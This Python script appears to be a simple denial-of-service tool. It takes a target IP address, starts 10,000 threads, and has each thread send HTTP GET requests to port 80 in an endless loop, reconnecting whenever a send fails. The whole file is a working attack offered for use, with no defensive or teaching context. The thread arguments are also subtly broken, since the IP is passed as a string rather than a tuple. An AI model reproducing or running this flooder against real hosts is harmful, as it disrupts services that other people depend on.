import socket
import threading
import optparse

def is_ip_adress(ip : str) -> bool:
    ip_list = ip.split(".")
    if len(ip_list) != 4:
        print("[-] Incorrect ip\n")
        exit()
    for elem in ip_list:
        for symbol in elem:
            if not (ord("0") <= ord(symbol) <= ord("9")):
                print("[-] Incorrect ip\n")
                exit()
        if elem[0] == '0' and len(elem) > 1:
            print("[-] Incorrect ip\n")
            exit()
        number = int(elem)  
        if not (0 <= number <= 255):
            print("[-] Incorrect ip\n")
            exit()
    return True

def get_arguments() -> str:
    parser = optparse.OptionParser()
    parser.add_option("-i" , "--ip" , dest = "ip" , help = "Target ip adress")
    arguments , options = parser.parse_args()
    if not arguments.ip:
        parser.error("[-] Please set IP adress of target , for more information use --help")
    return str(arguments.ip)

def parse_args() -> str:
    get_ip = get_arguments()
    if is_ip_adress(get_ip):
        return get_ip
    else:
        print("[-] Inccorect ip adress")
        exit()

def odnop(ip_adress : str) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_adress = (ip_adress , 80)
    sock.connect(server_adress)

    message = f"GET / HTTP/1.1\r\nHost: {ip_adress}\r\n\r\n"
    message = message.encode()

    while True:
        try:
            sock.sendall(message)
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_adress = (ip_adress , 80)
            sock.connect(server_adress)

def main_work():
    ip_adress = parse_args()

    threading_arr = []
    for i in range(10000):
        threading_arr.append(threading.Thread(target = odnop , args = (ip_adress)))

    for thread in threading_arr:
        thread.start()

main_work()
    